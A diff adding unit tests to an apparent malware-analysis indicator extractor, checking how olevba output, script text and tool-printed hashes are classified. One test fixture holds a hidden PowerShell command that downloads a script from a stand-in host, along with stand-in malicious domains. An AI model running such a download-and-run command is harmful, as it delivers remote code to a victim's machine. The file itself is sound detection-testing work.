@@ -93,3 +93,34 @@ def test_native_libs_apk_end_to_end(tmp_path, monkeypatch) -> None:
     iocs = json.loads((res / "iocs.json").read_text())["iocs"]
     assert not [i for i in iocs if i["type"] == "domain" and i["value"].endswith(".so")]
     assert not [i for i in iocs if i["type"] == "ipv6"]
+
+
+# --- more noise seen on sample.eml -------------------------------------------------
+
+def test_olevba_descriptions_are_not_commands_but_real_commands_are() -> None:
+    got = _text("|Suspicious|powershell |May run PowerShell commands | and uses cmd prompts\n"
+                "Shell \"powershell -nop -w hidden -c iwr http://x.facturas.example/a.ps1\"\n"
+                "cmd.exe calc\n& powershell bypass")
+    cmds = {v for t, v in got if t == "command"}
+    assert not [c for c in cmds if c in ("PowerShell commands", "cmd prompts")]
+    assert any(c.startswith("powershell -nop -w hidden") for c in cmds)
+    assert "cmd.exe calc" in cmds and "powershell bypass" in cmds
+    mods = {"oletools": {"tools": {"olevba": {"analysis": [
+        {"type": "Suspicious", "keyword": "powershell", "description": "May run PowerShell commands"}]}}}}
+    assert not [v for t, v in _vals(ioc.sources_from_modules(mods)) if t == "command"]
+
+
+def test_code_member_assignments_are_not_domains() -> None:
+    got = _text("var a = document.createElement('a'); a.href = URL.createObjectURL(f); a.download = 'F.zip'; "
+                "b.download('x'); if (r.status == 200) {} ; visit cdn.facturas.download or evil.download")
+    assert {v for t, v in got if t == "domain"} == {"cdn.facturas.download", "evil.download"}
+
+
+def test_digests_printed_by_a_tool_are_not_hashes_but_sample_hashes_are() -> None:
+    out = ("|          |MD5 = '70a4ea45faf7eb21940332aafc34e25b'   |          |CLSID: 00000300-0000-0000\n"
+           "|  sha256: 2f1c4a9e8b7d6c5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e")
+    tool = _vals([{"module": "rtf", "location": "pedido.doc › tools/rtfobj/output", "text": out}])
+    assert not [v for t, v in tool if t == "hash_like"]
+    # the same text as sample content (a ransom note, a report) is still mined
+    note = _vals([{"module": "email", "location": "body", "text": out}])
+    assert ("hash_like", "70a4ea45faf7eb21940332aafc34e25b") in note
